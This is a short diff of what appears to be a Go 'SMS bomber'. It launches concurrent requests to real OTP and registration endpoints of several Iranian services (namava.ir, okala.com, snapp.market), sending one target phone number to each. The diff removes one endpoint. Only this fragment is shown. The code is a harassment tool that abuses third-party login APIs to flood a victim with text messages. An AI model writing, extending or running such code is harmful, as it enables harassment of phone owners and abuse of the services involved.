@@ -300,9 +300,6 @@ func main() {
 		go sms("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", map[string]interface{}{
 			"UserName": phone,
 		}, ch) 
-		go sms("https://api-react.okala.com/C/CustomerAccount/OTPRegister", map[string]interface{}{
-			"mobile": phone,
-		}, ch)  
 //number3:
 		go sms("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass", map[string]interface{}{
 			"cellphone": phone,
